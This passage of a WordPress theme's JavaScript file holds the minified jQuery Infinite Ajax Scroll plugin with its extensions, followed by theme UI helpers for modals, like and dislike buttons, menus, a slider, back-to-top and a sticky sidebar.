        var a = !!("onscroll" in this.$scrollContainer.get(0)), b = this.getCurrentScrollOffset(this.$scrollContainer),
            c = this.getScrollThreshold();
        return a ? (this.hidePagination(), this.bind(), this.fire("ready"), this.nextUrl = this.getNextUrl(), b >= c ? (this.next(), this.one("rendered", function () {
            this.isInitialized = !0
        })) : this.isInitialized = !0, this) : !1
    }, c.prototype.reinitialize = function () {
        this.isInitialized = !1, this.unbind(), this.initialize()
    }, c.prototype.bind = function () {
        if (!this.isBound) {
            this.$scrollContainer.on("scroll", a.proxy(this.throttle(this.scrollHandler, 150), this));
            for (var b = 0, c = this.extensions.length; c > b; b++)this.extensions[b].bind(this);
            this.isBound = !0, this.resume()
        }
    }, c.prototype.unbind = function () {
        if (this.isBound) {
            this.$scrollContainer.off("scroll", this.scrollHandler);
            for (var a = 0,
                     b = this.extensions.length; b > a; a++)"undefined" != typeof this.extensions[a].unbind && this.extensions[a].unbind(this);
            this.isBound = !1
        }
    }, c.prototype.destroy = function () {
        this.unbind(), this.$scrollContainer.data("ias", null)
    }, c.prototype.on = function (b, c, d) {
        if ("undefined" == typeof this.listeners[b])throw new Error('There is no event called "' + b + '"');
        return d = d || 0, this.listeners[b].add(a.proxy(c, this), d), this
    }, c.prototype.one = function (a, b) {
        var c = this, d = function () {
            c.off(a, b), c.off(a, d)
        };
        return this.on(a, b), this.on(a, d), this
    }, c.prototype.off = function (a, b) {
        if ("undefined" == typeof this.listeners[a])throw new Error('There is no event called "' + a + '"');
        return this.listeners[a].remove(b), this
    }, c.prototype.next = function () {
        var a = this.nextUrl, b = this;
        if (this.pause(), !a)return this.fire("noneLeft", [this.getLastItem()]), this.listeners.noneLeft.disable(), b.resume(), !1;
        var c = this.fire("next", [a]);
        return c.done(function () {
            b.load(a, function (a, c) {
                b.render(c, function () {
                    b.nextUrl = b.getNextUrl(a), b.resume()
                })
            })
        }), c.fail(function () {
            b.resume()
        }), !0
    }, c.prototype.extension = function (a) {
        if ("undefined" == typeof a.bind)throw new Error('Extension doesn\'t have required method "bind"');
        return "undefined" != typeof a.initialize && a.initialize(this), this.extensions.push(a), this.isInitialized && this.reinitialize(), this
    }, a.ias = function (b) {
        var c = a(window);
        return c.ias.apply(c, arguments)
    }, a.fn.ias = function (b) {
        var d = Array.prototype.slice.call(arguments), e = this;
        return this.each(function () {
            var f = a(this), g = f.data("ias"),
                h = a.extend({}, a.fn.ias.defaults, f.data(), "object" == typeof b && b);
            if (g || (f.data("ias", g = new c(f, h)), a(document).ready(a.proxy(g.initialize, g))), "string" == typeof b) {
                if ("function" != typeof g[b])throw new Error('There is no method called "' + b + '"');
                d.shift(), g[b].apply(g, d)
            }
            e = g
        }), e
    }, a.fn.ias.defaults = {
        item: ".item",
        container: ".listing",
        next: ".next",
        pagination: !1,
        delay: 600,
        negativeMargin: 10
    }
}(jQuery);
var IASHistoryExtension = function (a) {
    return a = jQuery.extend({}, this.defaults, a), this.ias = null, this.prevSelector = a.prev, this.prevUrl = null, this.listeners = {prev: new IASCallbacks}, this.onPageChange = function (a, b, c) {
        if (window.history && window.history.replaceState) {
            var d = history.state;
            history.replaceState(d, document.title, c)
        }
    }, this.onScroll = function (a, b) {
        var c = this.getScrollThresholdFirstItem();
        this.prevUrl && (a -= this.ias.$scrollContainer.height(), c >= a && this.prev())
    }, this.onReady = function () {
        var a = this.ias.getCurrentScrollOffset(this.ias.$scrollContainer), b = this.getScrollThresholdFirstItem();
        a -= this.ias.$scrollContainer.height(), b >= a && this.prev()
    }, this.getPrevUrl = function (a) {
        return a || (a = this.ias.$container), jQuery(this.prevSelector, a).last().attr("href")
    }, this.getScrollThresholdFirstItem = function () {
        var a;
        return a = this.ias.getFirstItem(), 0 === a.length ? -1 : a.offset().top
    }, this.renderBefore = function (a, b) {
        var c = this.ias, d = c.getFirstItem(), e = 0;
        c.fire("render", [a]), jQuery(a).hide(), d.before(a), jQuery(a).fadeIn(400, function () {
            ++e < a.length || (c.fire("rendered", [a]), b && b())
        })
    }, this
};
IASHistoryExtension.prototype.initialize = function (a) {
    var b = this;
    this.ias = a, jQuery.extend(a.listeners, this.listeners), a.prev = function () {
        return b.prev()
    }, this.prevUrl = this.getPrevUrl()
}, IASHistoryExtension.prototype.bind = function (a) {
    a.on("pageChange", jQuery.proxy(this.onPageChange, this)), a.on("scroll", jQuery.proxy(this.onScroll, this)), a.on("ready", jQuery.proxy(this.onReady, this))
}, IASHistoryExtension.prototype.unbind = function (a) {
    a.off("pageChange", this.onPageChange), a.off("scroll", this.onScroll), a.off("ready", this.onReady)
}, IASHistoryExtension.prototype.prev = function () {
    var a = this.prevUrl, b = this, c = this.ias;
    if (!a)return !1;
    c.pause();
    var d = c.fire("prev", [a]);
    return d.done(function () {
        c.load(a, function (a, d) {
            b.renderBefore(d, function () {
                b.prevUrl = b.getPrevUrl(a), c.resume(), b.prevUrl && b.prev()
            })
        })
    }), d.fail(function () {
        c.resume()
    }), !0
}, IASHistoryExtension.prototype.defaults = {prev: ".prev"};
var IASNoneLeftExtension = function (a) {
    return a = jQuery.extend({}, this.defaults, a), this.ias = null, this.uid = (new Date).getTime(), this.html = a.html.replace("{text}", a.text), this.showNoneLeft = function () {
        var a = jQuery(this.html).attr("id", "ias_noneleft_" + this.uid), b = this.ias.getLastItem();
        b.after(a), a.fadeIn()
    }, this
};
IASNoneLeftExtension.prototype.bind = function (a) {
    this.ias = a, a.on("noneLeft", jQuery.proxy(this.showNoneLeft, this))
}, IASNoneLeftExtension.prototype.unbind = function (a) {
    a.off("noneLeft", this.showNoneLeft)
}, IASNoneLeftExtension.prototype.defaults = {
    text: "You reached the end.",
    html: '<div class="ias-noneleft" style="text-align: center;">{text}</div>'
};
var IASPagingExtension = function () {
    return this.ias = null, this.pagebreaks = [[0, document.location.toString()]], this.lastPageNum = 1, this.enabled = !0, this.listeners = {pageChange: new IASCallbacks}, this.onScroll = function (a, b) {
        if (this.enabled) {
            var c, d = this.ias, e = this.getCurrentPageNum(a), f = this.getCurrentPagebreak(a);
            this.lastPageNum !== e && (c = f[1], d.fire("pageChange", [e, a, c])), this.lastPageNum = e
        }
    }, this.onNext = function (a) {
        var b = this.ias.getCurrentScrollOffset(this.ias.$scrollContainer);
        this.pagebreaks.push([b, a]);
        var c = this.getCurrentPageNum(b) + 1;
        this.ias.fire("pageChange", [c, b, a]), this.lastPageNum = c
    }, this.onPrev = function (a) {
        var b = this, c = b.ias, d = c.getCurrentScrollOffset(c.$scrollContainer), e = d - c.$scrollContainer.height(),
            f = c.getFirstItem();
        this.enabled = !1, this.pagebreaks.unshift([0, a]), c.one("rendered", function () {
            for (var d = 1,
                     g = b.pagebreaks.length; g > d; d++)b.pagebreaks[d][0] = b.pagebreaks[d][0] + f.offset().top;
            var h = b.getCurrentPageNum(e) + 1;
            c.fire("pageChange", [h, e, a]), b.lastPageNum = h, b.enabled = !0
        })
    }, this
};
IASPagingExtension.prototype.initialize = function (a) {
    this.ias = a, jQuery.extend(a.listeners, this.listeners)
}, IASPagingExtension.prototype.bind = function (a) {
    try {
        a.on("prev", jQuery.proxy(this.onPrev, this), this.priority)
    } catch (b) {
    }
    a.on("next", jQuery.proxy(this.onNext, this), this.priority), a.on("scroll", jQuery.proxy(this.onScroll, this), this.priority)
}, IASPagingExtension.prototype.unbind = function (a) {
    try {
        a.off("prev", this.onPrev)
    } catch (b) {
    }
    a.off("next", this.onNext), a.off("scroll", this.onScroll)
}, IASPagingExtension.prototype.getCurrentPageNum = function (a) {
    for (var b = this.pagebreaks.length - 1; b > 0; b--)if (a > this.pagebreaks[b][0])return b + 1;
    return 1
}, IASPagingExtension.prototype.getCurrentPagebreak = function (a) {
    for (var b = this.pagebreaks.length - 1; b >= 0; b--)if (a > this.pagebreaks[b][0])return this.pagebreaks[b];
    return null
}, IASPagingExtension.prototype.priority = 500;
var IASSpinnerExtension = function (a) {
    return a = jQuery.extend({}, this.defaults, a), this.ias = null, this.uid = (new Date).getTime(), this.src = a.src, this.html = a.html.replace("{src}", this.src), this.showSpinner = function () {
        var a = this.getSpinner() || this.createSpinner(), b = this.ias.getLastItem();
        b.after(a), a.fadeIn()
    }, this.showSpinnerBefore = function () {
        var a = this.getSpinner() || this.createSpinner(), b = this.ias.getFirstItem();
        b.before(a), a.fadeIn()
    }, this.removeSpinner = function () {
        this.hasSpinner() && this.getSpinner().remove()
    }, this.getSpinner = function () {
        var a = jQuery("#ias_spinner_" + this.uid);
        return a.length > 0 ? a : !1
    }, this.hasSpinner = function () {
        var a = jQuery("#ias_spinner_" + this.uid);
        return a.length > 0
    }, this.createSpinner = function () {
        var a = jQuery(this.html).attr("id", "ias_spinner_" + this.uid);
        return a.hide(), a
    }, this
};
IASSpinnerExtension.prototype.bind = function (a) {
    this.ias = a, a.on("next", jQuery.proxy(this.showSpinner, this)), a.on("render", jQuery.proxy(this.removeSpinner, this));
    try {
        a.on("prev", jQuery.proxy(this.showSpinnerBefore, this))
    } catch (b) {
    }
}, IASSpinnerExtension.prototype.unbind = function (a) {
    a.off("next", this.showSpinner), a.off("render", this.removeSpinner);
    try {
        a.off("prev", this.showSpinnerBefore)
    } catch (b) {
    }
};
var IASTriggerExtension = function (a) {
    return a = jQuery.extend({}, this.defaults, a), this.ias = null, this.html = a.html.replace("{text}", a.text), this.htmlPrev = a.htmlPrev.replace("{text}", a.textPrev), this.enabled = !0, this.count = 0, this.offset = a.offset, this.$triggerNext = null, this.$triggerPrev = null, this.showTriggerNext = function () {
        if (!this.enabled)return !0;
        if (!1 === this.offset || ++this.count < this.offset)return !0;
        var a = this.$triggerNext || (this.$triggerNext = this.createTrigger(this.next, this.html)),
            b = this.ias.getLastItem();
        return b.after(a), a.fadeIn(), !1
    }, this.showTriggerPrev = function () {
        if (!this.enabled)return !0;
        var a = this.$triggerPrev || (this.$triggerPrev = this.createTrigger(this.prev, this.htmlPrev)),
            b = this.ias.getFirstItem();
        return b.before(a), a.fadeIn(), !1
    }, this.onRendered = function () {
        this.enabled = !0
    }, this.createTrigger = function (a, b) {
        var c, d = (new Date).getTime();
        return b = b || this.html, c = jQuery(b).attr("id", "ias_trigger_" + d), c.hide(), c.on("click", jQuery.proxy(a, this)), c
    }, this
};
IASTriggerExtension.prototype.bind = function (a) {
    this.ias = a, a.on("next", jQuery.proxy(this.showTriggerNext, this), this.priority), a.on("rendered", jQuery.proxy(this.onRendered, this), this.priority);
    try {
        a.on("prev", jQuery.proxy(this.showTriggerPrev, this), this.priority)
    } catch (b) {
    }
}, IASTriggerExtension.prototype.unbind = function (a) {
    a.off("next", this.showTriggerNext), a.off("rendered", this.onRendered);
    try {
        a.off("prev", this.showTriggerPrev)
    } catch (b) {
    }
}, IASTriggerExtension.prototype.next = function () {
    this.enabled = !1, this.ias.pause(), this.$triggerNext && (this.$triggerNext.remove(), this.$triggerNext = null), this.ias.next()
}, IASTriggerExtension.prototype.prev = function () {
    this.enabled = !1, this.ias.pause(), this.$triggerPrev && (this.$triggerPrev.remove(), this.$triggerPrev = null), this.ias.prev()
}, IASTriggerExtension.prototype.defaults = {
    text: "Load more items",
    html: '<div class="ias-trigger ias-trigger-next" style="text-align: center; cursor: pointer;"><a>{text}  <i class="fa fa-chevron-circle-right"></i></a></div>',
    textPrev: "Load previous items",
    htmlPrev: '<div class="ias-trigger ias-trigger-prev" style="text-align: center; cursor: pointer;"><a>{text}</a></div>',
    offset: 0
}, IASTriggerExtension.prototype.priority = 1e3;
function chen_tixing(tit, msg, post, buttom, clss, clss2) {
    html = '<div class="chen_tixing">';
    html += '<div class="ti_cont">';
    html += '<h2>' + tit + ':</h2>';
    html += '<div class="cloe' + clss + '"><i class="fa fa-close"></i></div>';
    html += '<div class="msg">';
    html += '<h3>' + msg + '</h3>';
    html += '<p>' + post + '</p>';
    html += '</div>';
    if (clss2) {
        html += '<div class="cloes' + clss2 + '">' + buttom + '</div>';
    }
    html += '</div>';
    html += '</div>';
    $(document.body).append(html);
    $('.chen_tixing').animate({opacity: '1'});
    $('.ti_cont').animate({opacity: '1', height: '300px'});
}
function ajax_donghua(msg) {
    html = '<div class="ajax_donghua">';
    html += '<i class="fa fa-spinner fa-spin"></i>';
    html += '<span>' + msg + '</span>';
    html += '</div>';
    $(document.body).append(html);
    $('.chen_tixing').animate({opacity: '1'});
}
$(document.body).on('click', '.gb_cloe', function () {
    var html = $('.chen_tixing');
    html.remove();
    window.location.href = window.location.href;
})
$(document.body).on('click', '.fk_cloe', function () {
    var html = $('.chen_tixing');
    html.remove();
})
$("img").lazyload({effect: "fadeIn", threshold: 200});
$.fn.postLike = function () {
    if ($(this).hasClass('done')) {
        alert('您已经赞过了，明天再来吧！');
    } else {
        $(this).addClass('done');
        var id = $(this).data("id"), action = $(this).data('action'),
            rateHolder = $(this).children('.count').children('.ct_ding');
        var ajax_data = {action: "bigfa_like", um_id: id, um_action: action};
        $.post(beauty.ajax_url, ajax_data, function (data) {
            $(rateHolder).html(data)
        });
        return false
    }
};
$(document).on("click", ".favorite", function () {
    $(this).postLike()
});
$.fn.postLikeno = function () {
    if ($(this).hasClass('done')) {
        alert('您已经踩过了，明天再来吧！');
    } else {
        $(this).addClass('done');
        var id = $(this).data("id"), action = $(this).data('action'),
            rateHolder = $(this).children('.count').children('.ct_ding');
        var ajax_data = {action: "bigfa_like_no", um_id: id, um_action: action};
        $.post(beauty.ajax_url, ajax_data, function (data) {
            $(rateHolder).html(data)
        });
        return false
    }
};
$(document).on("click", ".tiresome", function () {
    $(this).postLikeno()
});
function isKeyPressed(event) {
    if (event.altKey == 1) {
        alert("å“Žï¼åˆæŒ‰é”™é”®äº†ã€‚ã€‚ã€‚")
    }
}
$(".yscd").click(function () {
    $(".user-left").animate({left: '0px'});
    $(".yscd").animate({left: '-160px'});
    $(".yinxsh").toggle();
});
$(".yinxsh").click(function () {
    $(".user-left").animate({left: '-180px'});
    $(".yscd").animate({left: '0px'});
    $(".yinxsh").toggle();
});
$('.share-fx').on('click', function () {
    $(this).toggleClass('share-dj');
    $('.myshare').slideToggle();
});

$(function ($) {
    $.fn.hoverDelay = function (options) {
        var defaults = {
            hoverDuring: 300, outDuring: 200, hoverEvent: function () {
                $.noop();
            }, outEvent: function () {
                $.noop();
            }
        };
        var sets = $.extend(defaults, options || {});
        var hoverTimer, outTimer;
        return $(this).each(function () {
            $(this).hover(function () {
                clearTimeout(outTimer);
                hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
            }, function () {
                clearTimeout(hoverTimer);
                outTimer = setTimeout(sets.outEvent, sets.outDuring);
            });
        });
    }
    $(".login_text").hoverDelay({
        hoverEvent: function () {
            $(".nav_user").stop().slideDown();
        }, outEvent: function () {
            $(".nav_user").slideUp();
        }
    });
    var scrollTop = 0, t = 0;
    $(window).scroll(function () {
        var scrollTop = $(this).scrollTop();
        var scrollHeight = $(document).height();
        var windowHeight = $(this).height();
        if (scrollTop + windowHeight == scrollHeight) {
            $('.nav_headertop').removeClass('hiddened');
        }
        else {
            if (t <= scrollTop && scrollTop > 100) {
                $('.nav_headertop').addClass('hiddened');
            } else {
                $('.nav_headertop').removeClass('hiddened');
            }
        }
        setTimeout(function () {
            t = scrollTop;
        }, 0);
    });
});
/* 移动端导航VS幻灯片参数 */
$(function () {
    if ($('.bxslider').hasClass('tow_slider')) {
        $('.bxslider').bxSlider({auto: true, captions: false});
    } else {
        $('.bxslider').bxSlider({auto: true, captions: false, mode: 'fade'});
    }

    $('.slide-wrapper').on('touchstart', 'li', function (e) {
        $(this).addClass('current').siblings('li').removeClass('current')
    });
    $('a.slide-menu').on('click', function (e) {
        var wh = $('.wrapper').height();
        $('.slide-mask').css('height', wh).show();
        $('.slide-wrapper').css('height', wh).addClass('moved')
    });
    $('.slide-mask').on('click', function () {
        $('.slide-mask').hide();
        $('.slide-wrapper').removeClass('moved')
    });
    $('.logint').on('click', function () {
        $('#back').load(beauty.home_url + '/login');
        document.getElementById("back").style.display = ""
    })
});
/* 返回顶部按钮 */
function chenxingweb() {
    this.init();
}
chenxingweb.prototype = {
    constructor: chenxingweb, init: function () {
        this._initBackTop()
    }, _initBackTop: function () {
        var $backTop = this.$backTop = $('<div class="cbbfixed"><a class="gotop cbbtn"><i class="fa fa-angle-up"></i></a></div>');
        $('body').append($backTop);
        $backTop.click(function () {
            $("html, body").animate({scrollTop: 0}, 120)
        });
        var timmer = null;
        $(window).bind("scroll", function () {
            var d = $(document).scrollTop(), e = $(window).height();
            0 < d ? $backTop.css("bottom", "10px") : $backTop.css("bottom", "-90px");
            clearTimeout(timmer);
            timmer = setTimeout(function () {
                clearTimeout(timmer)
            }, 100)
        })
    }
}
var chenxingweb = new chenxingweb();
/* 侧边跟随代码 */
$(window).load(function () {
    if ($('#sidebar').length > 0) {
        var top = $('#sidebar').offset().top - parseFloat($('#sidebar').css('marginTop').replace(/auto/, 0));
        var footTop = $('#footer').offset().top - parseFloat($('#footer').css('marginTop').replace(/auto/, 0));
        var maxY = footTop - $('#sidebar').outerHeight();
        $(window).scroll(function (evt) {
            var y = $(this).scrollTop();
            if (y > top) {
                if (y < maxY) {
                    $('#sidebar').addClass('fixed').removeAttr('style')
                }
            } else {
                $('#sidebar').removeClass('fixed')
            }
        })
    }
});